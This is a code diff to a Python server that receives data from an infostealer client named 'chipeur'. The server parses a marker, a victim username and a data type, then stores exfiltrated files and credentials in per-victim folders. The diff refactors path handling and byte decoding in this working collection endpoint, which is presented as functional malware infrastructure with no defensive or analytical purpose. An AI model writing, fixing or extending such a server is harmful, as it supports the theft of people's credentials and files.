@@ -7,19 +7,19 @@ def createpath(username: str, datatype: str):
     """ create the folder to store the data ./username/datatype """
     try :
         os.mkdir(username)
-    except FileExistsError:
+    except FileExistsError: 
         print(f"DEBUG: {username} directory already exists.")
-    except:
-        print(f"DEBUG: Error while creating the {username} directory. Abort")
-        return
+    # except:
+    #     print(f"DEBUG: Error while creating the {username} directory. Abort")
+    #     return
+        
     
-    path = username + "/" + datatype
+    path = os.path.join(username,datatype)
     try :
         os.mkdir(path)
     except FileExistsError:
         print(f"DEBUG: {path} directory already exists.")
 
-    path: str = username + "/" + datatype + "/"
     return path
 
 def savefile(username: str, datatype: str, filename: str, client: socket.socket):
@@ -28,13 +28,13 @@ def savefile(username: str, datatype: str, filename: str, client: socket.socket)
     path = createpath(username, datatype)
 
     # creating a unique file to avoid overwriting
-    path = path + str(int(time.time())) + "_" + filename
+    path = os.path.join(path, str(int(time.time())) + "_" + filename)
     fic = open(path, "w")
-    ch = client.recv(9).decode("utf-8")
+    ch = client.recv(9).decode()
     # ending condition, chipeur client allways send it
     while ch[-9:] != "[RUEPIHC]":
         try:
-            cur_c = client.recv(1).decode("utf-8")
+            cur_c = client.recv(1).decode()
             ch += cur_c
         except:
             fic.write(ch)
@@ -48,7 +48,7 @@ def savefile(username: str, datatype: str, filename: str, client: socket.socket)
 def savecreds(username: str, datatype: str, client: socket.socket):
     """ create and write a file in the directory ./username/file/ """
     path = createpath(username, datatype)
-    path = path + "creds_" + str(int(time.time()))
+    path = os.path.join(path, "creds_" + str(int(time.time())))
     fic = open(path, "w")
     ch = client.recv(9).decode("utf-8")
     # ending condition, chipeur client allways send it
@@ -66,24 +66,14 @@ def savecreds(username: str, datatype: str, client: socket.socket):
     fic.close()
     
 
-def read_until_next_pipe_UTF16(client: socket.socket):
+def read_bytes_until_next_pipe(client: socket.socket):
     """ this function is used to parse the chipeur request and gather the information of the request """
-    ch = ""
-    cur_c = ""
-    attempt = 0
-    while cur_c != "|":
-        try:
-            recv = client.recv(2)
-            cur_c = recv.decode("utf-16")
-            ch += cur_c
-            attempt = 0
-        except UnicodeDecodeError:
-            print("DEBUG: read_until_next_pipe_UTF16: UnicodeDecodeError: skipping")
-            time.sleep(2)
-            attempt += 1
-            if attempt == 3:
-                print("DEBUG: read_until_next_pipe_UTF16: 3rd time reading fails: exiting")
-                raise TimeoutError
+    ch = b""
+    cur_c = b""
+    while cur_c != b"|":
+        cur_c = client.recv(1)
+        ch += cur_c
+        
     # we return the data before the pipe
     return ch[:-1]
 
@@ -92,24 +82,29 @@ def handle_client(client_socket, addr):
     try:
         while True:
             # should read [CHIPEUR]
-            chipeur = read_until_next_pipe_UTF16(client_socket)
+            chipeur = read_bytes_until_next_pipe(client_socket).decode("utf-8")
+            print(chipeur)
             if "[CHIPEUR]" not in chipeur:
                 client_socket.close()
                 break
-            
-            username = read_until_next_pipe_UTF16(client_socket)
+        
+            username = read_bytes_until_next_pipe(client_socket)[:-1].decode("utf-16-be")
+            print(username)
 
-            datatype = read_until_next_pipe_UTF16(client_socket)
+            datatype = read_bytes_until_next_pipe(client_socket).decode("utf-8")
+            print(datatype)
 
             # only two datatypes possible
             if datatype == "file":
-                filename = read_until_next_pipe_UTF16(client_socket)
+                filename = read_bytes_until_next_pipe(client_socket)[:-1].decode("utf-16-be")
+                print(filename)
                 savefile(username, datatype, filename, client_socket)
 
             if datatype == "credentials":
                 savecreds(username, datatype, client_socket)
 
-
+    except UnicodeDecodeError as error:
+        print(f"DEBUG: Connection closed: {error}")
     except ConnectionResetError as error:
         print(f"DEBUG: Connection closed: {error}")
     except TimeoutError as error:
